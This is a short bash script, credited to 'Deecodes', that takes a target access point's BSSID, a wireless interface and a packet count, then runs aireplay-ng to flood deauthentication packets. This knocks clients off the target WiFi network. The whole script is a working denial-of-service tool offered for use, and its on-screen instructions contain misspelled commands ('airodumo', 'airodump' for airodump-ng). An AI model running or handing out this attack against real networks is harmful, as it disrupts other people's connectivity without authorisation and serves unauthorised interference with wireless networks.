#!/bin/bash
START=`date +%s`

clear

neofetch
echo author: Deecodes | lolcat
echo "First copy the target (bssid) by this command" "(sudo airodump wlan1)" | lolcat
echo "Did you copied..!!!!" "(y/n)"
read response

if [ "$response" == "y" ]; then
clear

elif [ "$response" == "n" ]; then
echo "Go and copy the (bssid) by this command (sudo airodumo wlan1)" | lolcat
exit
fi

# Targer bssid
read -p  "Enter the target bssid : " bssid

#Your wirless interface (wifi adaptor name)
read -p  "Enter the Network Interface : " interface

#Packets for Deauth (Disconnect)
read -p "Enter the number of packets (Recommended - 100) : " packets

sudo aireplay-ng --deauth $packets -a $bssid $interface

END=`date +%s`
TIME_TAKEN=$((END-START))

echo Time Taken  : $TIME_TAKEN seconds
